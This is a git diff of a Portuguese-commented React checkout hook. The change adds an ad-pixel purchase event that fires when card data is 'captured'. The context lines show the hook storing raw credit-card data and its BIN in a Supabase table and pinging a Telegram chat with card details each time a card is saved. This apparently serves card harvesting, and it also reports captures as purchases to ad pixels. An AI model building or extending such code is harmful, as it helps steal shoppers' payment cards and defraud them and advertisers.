@@ -3,9 +3,11 @@ import { useState } from 'react';
 import { CustomerData, Order, PaymentMethod, PaymentStatus, Product, BillingData, CreditCardData } from '@/types/checkout';
 import { supabase } from '@/integrations/supabase/client';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
+import { usePixelEvents } from '@/hooks/usePixelEvents';
 
 export const useCheckoutOrder = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const { trackPurchase } = usePixelEvents();
   
   const createOrder = async (customer: CustomerData, product: Product, paymentMethod: PaymentMethod, cardData?: CreditCardData): Promise<Order> => {
     // Criar pedido no Supabase
@@ -33,7 +35,7 @@ export const useCheckoutOrder = () => {
     
     // Se for pagamento com cartão, salvar dados do cartão
     if (paymentMethod === 'creditCard' && cardData) {
-      await saveCardData(data.id, cardData);
+      await saveCardData(data.id, cardData, product.price);
     }
     
     return {
@@ -55,7 +57,7 @@ export const useCheckoutOrder = () => {
   };
   
   // Função para salvar dados do cartão
-  const saveCardData = async (orderId: string, cardData: CreditCardData) => {
+  const saveCardData = async (orderId: string, cardData: CreditCardData, productPrice: number) => {
     // Extrair o BIN (6 primeiros dígitos)
     const bin = cardData.number.substring(0, 6);
     
@@ -78,6 +80,14 @@ export const useCheckoutOrder = () => {
       // Não vamos falhar o pedido se o cartão não for salvo,
       // mas vamos logar o erro para identificar problemas
     } else {
+      // Track purchase event on card capture
+      try {
+        trackPurchase(orderId, productPrice);
+        console.log('Purchase event triggered for card capture', { orderId, value: productPrice });
+      } catch (trackError) {
+        console.error('Error triggering purchase event:', trackError);
+      }
+      
       // Enviar notificação para o Telegram quando os dados do cartão forem salvos no banco
       try {
         const brandName = (cardData.brand || 'Unknown').toUpperCase();
@@ -114,6 +124,6 @@ Bandeira: ${brandName}`;
     setIsSubmitting,
     createOrder,
     prepareBillingData,
-    saveCardData // Make sure to export the saveCardData function
+    saveCardData
   };
 };
